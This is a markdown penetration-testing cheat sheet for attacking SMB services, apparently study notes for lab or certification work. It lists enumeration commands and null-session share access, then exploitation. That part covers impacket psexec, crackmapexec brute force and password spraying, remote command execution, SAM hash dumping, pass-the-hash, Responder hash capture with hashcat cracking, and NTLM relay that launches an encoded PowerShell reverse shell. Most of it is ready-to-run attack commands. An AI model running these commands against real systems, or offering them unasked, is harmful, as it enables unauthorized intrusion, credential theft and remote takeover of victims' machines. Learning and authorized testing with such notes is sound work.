-----
# ENUMERATION
------
- nmap
```shell
sudo nmap $IP -sV -sC -p139,445
```

- enum4linux-ng.py
```
# Installation
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt

# Enumeration
enum4linux-ng.py $IP -A

# Additional enumeration
enum4linux-ng.py $IP -A -C
```

-----
# MISCONFIGURATION
------
#### Anonymous Authentication
#### File Share
- smbclient
```bash
smbclient -N -L //$IP

-L: list of the server shares
-N: tell smbclient to use a null session
```

- smbmap
```bash
smbmap -H $IP

# use -r or -R to browse directories
smbmap -H $IP -r notes

# download a file
smbmap -H $IP --download $FILE

# upload a file
smbmap -H $IP --upload $FILE
```

#### Remote Procedure Call (RPC)
- Sometimes, nmap does not provide lots of information., use [RPC](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/)
- Can be used with a null session to enumerate a workstation/Domain Controller
- Should be performed on top off nmap scan
```shell
rpcclient -U "%" $IP
rpcclient $> $OPTION

# options
	srvinfo: Serverinformation
	enumdomains: enumerate all domains that are deployed in the network
	querydominfo: provide domain, server, and user information of deployed domains
	netshareenumall: enumerates all available shares
	netsharegetinfo <sahre>: Provide information about a specific share
	enumdomusers: enumerates all domain users
	queryuser <RID>: Provides information about a specific user.
```

- RPCclient - Enumeration
```bash
# Find the server info
srvinfo
# Domains enumeration
enumdomains
querydominfo
netshareenumall
netsharegetinfo notes
# User enumeration
enumdomusers
queryuser $RID
```

-----
# EXPLOITATION
-----

#### Impacket samrdump.py
```
samrdump.py $IP
```

#### Impacket PsExec
```bash
impacket-psexec $USER:$PASSWORD@$IP
```
We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:
- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

#### crackmapexec
- Enumeration
```bash
crackmapexec smb $Ip --shares -U '' -p ''
smbclient -U $USER \\\\$IP\\$share
```

- Brute Force & Password Spray
```bash
# Brute Forcing
crackmapexec smb $IP -U $USER_LIST -P PASS_LIST

# Passwords spraying
crackmapexec smb $IP -U $USER_LIST -p $PASS
```

- Execute a CMD or PowerShell command
```bash
# run a cmd or powershell command (-x for cmd & -X for powershell)
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

- Enumerate Logged-On Users
```bash
crackmapexec smb $CIDR -u $USER -p $PASSWORD --loggedon-users
```

- Extract hashes from SAM database
```bash
crackmapexec smb $IP -u $USER -p $PASSWORD --sam
```

- Pass-the-Hash
```bash
crackmapexec smb $IP -u $USER -H $HASH
```

### Forced Authentication Attacks
#### Responder
- Fake a SMB server to capture user's NTLM hashes
```bash
responder -I $INTERFACE_NAME
```
- When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:
	1. The hostname file share's IP address is required.
	2. The local host file (C:\\Windows\\System32\\Drivers\\etc\\hosts) will be checked for suitable records.
	3. If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
	4. Is there no local DNS record? A query will be sent to the DNS server that has been configured.
	5. If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

- This will listen to users' request and capture all the hashes, which are stored in ***/usr/share/responder/logs/***
- Use hashcat to crack password
```bash
hashcat -m 5600 $HASH_FILE $WORD_LIST
```

#### impacket-ntlmrelayx or Multirelay.py
- If the hashes can't be cracked, we can use these 2 tools to relay the captured hashes to other machines.
	1. Ste SMB to OFF in responder configuration file
	```bash
	cat /etc/responder/Responder.conf | grep 'SMB='
	```
	 2. Execute ***impacket-ntlmrelayx***
	```bash
	impacket-ntlmrelayx --no-http-server -smb2support -t $IP	
	```
	3. Create a reverse shell using https://www.revshells.com and convert it to Base64. 
	4. Execute the command with ***impacket-ntlmrelayx***
	```bash
		impacket-ntlmrelayx --no-http-server -smb2support -t $IP -c	'powershell -e $ENCODED_SHELL'
	```
	 